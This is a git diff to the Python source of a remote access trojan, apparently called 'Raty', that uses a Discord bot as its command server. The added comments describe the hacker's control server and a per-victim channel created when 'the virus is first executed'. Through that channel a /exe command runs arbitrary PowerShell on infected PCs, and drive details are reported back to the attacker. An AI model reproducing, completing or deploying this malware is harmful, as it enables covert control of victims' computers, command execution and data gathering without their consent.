@@ -20,8 +20,15 @@ import platform
 import win32api
 import shutil
 
-#discord bot token
+# Discord integration API token - this program uses an integration bot to access the hacker's Discord control server. It is very easy to setup a BOT, here is a tutorial on how to do it: https://www.youtube.com/watch?v=nW8c7vT6Hl4&ab_channel=Lucas
+#                                                                                           <[Discord API Bot Token - Insert as string on the token variable]> 
+
 token = "<Bot Token>"
+
+
+
+# Declaring some functions to simplify the code
+#          <[Declaring Functions]>
 
 def available_disks():
     drives = win32api.GetLogicalDriveStrings()
@@ -33,18 +40,43 @@ def disk_space(drive_letter):
       return [total // (2**30), used // (2**30), free // (2**30)]
 
 
+
+
+
+# Declaring global variables to avoid errors and simplify the overall code
+#                 <[Declaring Global Variables]>
+
 sch = 5
 cname = ''
 
-# Define client object
+
+
+
+
+# Contains the interaction methods with the Discord Server.
+#         <[Defining Discord Client Object]>
+
 client = discord.Client()
 
-# On connect
+
+
+
+
+
+# What happens when the bot successfully connects to Discord API
+#                         <[Code setup]>
+
 @client.event
 async def on_ready():
+      # Shows startup message and clears the prompt to give a more cleaner look. The bot should appear online as soon as this message shows up.
+      #                                                           <[Connection Notification]>
+
       global sch, cid, cname
       os.system("cls")
       print(colored("Raty trojan online!", 'green'))
+
+
+      
       txtcl = []
       server = client.guilds
       found = False
@@ -85,10 +117,19 @@ async def on_ready():
 # When a message is received
 @client.event
 async def on_message(message):
+      # This is where the channel objects get defined and ready to be used, the description of each channel can be found bellow.
+      #                                         <[Initialization - channel objects]>
+
       global cname
       sch = discord.utils.get(client.guilds[0].channels, name=cname)
       main_channel = client.get_channel(811346666879713281)
-      #If the message is in the all bots channel: (awaiting development)
+
+
+
+
+      # If the message is in the all bots channel - this channel is where the hacker can execute commands for all infected PCs, so if the hacker types, for example "/exe shutdown /s /t 00" every computer executes that command. 
+      #                                                                                            <[This feature is awaiting for developent]>
+
       if message.channel == main_channel:
             #/exe command 
             if f"/exe {cid} " in message.content[0:int(6+len(str(cid)))]:
@@ -97,7 +138,10 @@ async def on_message(message):
 
 
 
+
       #If the message is in the unique control channel - this is an unique channel the PC creates when the virus is first executed. In this channel, only this PC will follow the commands written on it.
+      #                                                                        <[This feature is currently on developent]>
+
       elif message.channel == sch:
             #/exe command - executes a custom powershell command
             if f"/exe " in message.content[0:5]:
@@ -159,4 +203,6 @@ async def on_message(message):
                         embed.add_field(name=f"Free Space on {disk[:-1]}", value=str(disk_space(disk)[2]) + "GB", inline=True)
                         embed.add_field(name=f"Used Space on {disk[:-1]}", value=str(disk_space(disk)[1]) + "GB", inline=True)
                   await sch.send(embed=embed)
+
+
 client.run(token)
